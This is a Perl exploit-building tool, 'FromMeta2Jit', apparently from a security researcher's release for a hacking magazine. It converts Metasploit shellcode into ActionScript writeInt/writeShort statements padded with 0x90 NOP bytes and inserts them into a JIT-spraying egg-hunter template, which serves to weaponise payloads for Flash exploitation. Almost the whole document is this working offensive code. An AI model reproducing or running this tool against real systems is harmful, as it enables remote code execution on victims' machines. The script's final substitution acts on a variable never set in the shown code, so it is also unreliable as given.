#!/usr/bin/perl
#
# FromMeta2Jit
# egg-hunter JIT  shellcode
# Author: Alexey Sintsov
#		  a.sintsov@dsec.ru
#		  dookie@inbox.ru
#
# PAYLOADS by METASPLOIT
#
#

use Switch;

$ARGC=@ARGV;

if ( ($ARGV[0]=~/-help|-h|help/) || ($ARGC<1)) {
 print "\n Usage:\n\n $0 <payload> \n";
 exit;
}


print "\n/*\nFrommETaSploit2JIT v 0.9b\nby Alexey Sintsov [DSecRG]\nhttp://dsecrg.com\n\nSpecial release for XAKEP magazine (http://www.xakep.ru)\n*/\n\n";

require($ARGV[0]) or die "Not found this payload: $ARGV[0]\n";


$shellcode=makeShellAS($buf,$ARGV[1]);


print $shellcode;

##################SUB##############

sub makeShellAS
{
	local ($payl,$par)=$_;
	($payl, $par) = ($_[0], $_[1]);
	require ("main.as");
	my $ret="";
	my $co=0;

	my $ll=length($payl);
	$ret="\n		//PAYLOAD\n";
	for($i=0;$i<$ll;)
	{
		
		$sv=$ll-$i;
		
		switch($sv)
		{

		case 3 { 	$ret.="		val.writeInt(0x";
				$ret.="90";
				$ret.=sprintf("%02lx",ord substr($payl,($i+2),1));
				$ret.=sprintf("%02lx",ord substr($payl,($i+1),1));
				$ret.=sprintf("%02lx",ord substr($payl,($i),1));
				$ret.=");\n";
				$i+=3;
				}
		case 2 { 	$ret.="		val.writeShort(0x";
				$ret.=sprintf("%02lx",ord substr($payl,($i+1),1));
				$ret.=sprintf("%02lx",ord substr($payl,($i),1));
				$ret.=");\n";
				$i+=2;
				}
		case 1 { 	$ret.="		val.writeShort(0x";
				$ret.="90";
				$ret.=sprintf("%02lx",ord substr($payl,($i),1));
				$ret.=");\n";
				$i++;
				}

		else {		$ret.="		val.writeInt(0x";
				$ret.=sprintf("%02lx",ord substr($payl,($i+3),1));
				$ret.=sprintf("%02lx",ord substr($payl,($i+2),1));
				$ret.=sprintf("%02lx",ord substr($payl,($i+1),1));
				$ret.=sprintf("%02lx",ord substr($payl,($i),1));
				$ret.=");\n";
				$i+=4;
				}
		}
		
	}

$payl2 =~ s/%31337%/$ret/g;
return $payl2;
}